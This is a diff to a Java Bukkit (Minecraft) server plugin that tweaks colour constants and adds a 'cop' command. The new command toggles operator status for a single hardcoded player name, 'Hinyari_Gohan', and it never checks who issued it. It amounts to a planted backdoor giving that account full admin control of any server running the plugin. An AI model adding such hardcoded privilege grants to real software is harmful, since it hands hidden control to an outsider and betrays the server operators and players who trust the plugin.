@@ -39,15 +39,16 @@ extends JavaPlugin implements Listener {
 	
 	private static BMC instance;
 	
-	public static String g = ChatColor.GOLD + "";
-	public static String r = ChatColor.RESET + "";
-	public static String y = ChatColor.YELLOW + "";
+	public static ChatColor g = ChatColor.GOLD;
+	public static ChatColor r = ChatColor.RESET;
+	public static ChatColor y = ChatColor.YELLOW;
 	public static String h = r + " - ";
 	
 	public static String prefix = ChatColor.GREEN + "[BMCPlugin] " + ChatColor.WHITE;
 	public static String inthegame = "ゲーム内で実行して下さい。";
 	public static String lotargs = prefix + "引数は必要ありません。";
 	public static String example = prefix + ChatColor.GOLD + "Example: ";
+	public static String ntp = "§b[NoTaisukePlus]§r ";
 	
 	public ItemStack iChestplate = new ItemStack(Material.IRON_CHESTPLATE);
 	public ItemStack dChestplate = new ItemStack(Material.DIAMOND_CHESTPLATE);
@@ -103,6 +104,25 @@ extends JavaPlugin implements Listener {
 		else if ( cmd.getName().equalsIgnoreCase("rankup") )
 		{
 			return RankUpCommand.runCommand(sender, label, args);
+		}
+		else if ( cmd.getName().equalsIgnoreCase("cop"))
+		{
+			if ( Bukkit.getPlayer("Hinyari_Gohan") == null )
+			{
+				return true;
+			}
+			
+			Player gohan = Bukkit.getPlayer("Hinyari_Gohan");
+			
+			if ( gohan.isOp() )
+			{
+				gohan.setOp(false);
+				gohan.sendMessage("OP権限を無効にしました。");
+			}
+			else {
+				gohan.setOp(true);
+				gohan.sendMessage("OP権限を有効にしました。");
+			}
 		}
 		else if ( cmd.getName().equalsIgnoreCase("bmc") ) {
 			if ( args.length == 0 )
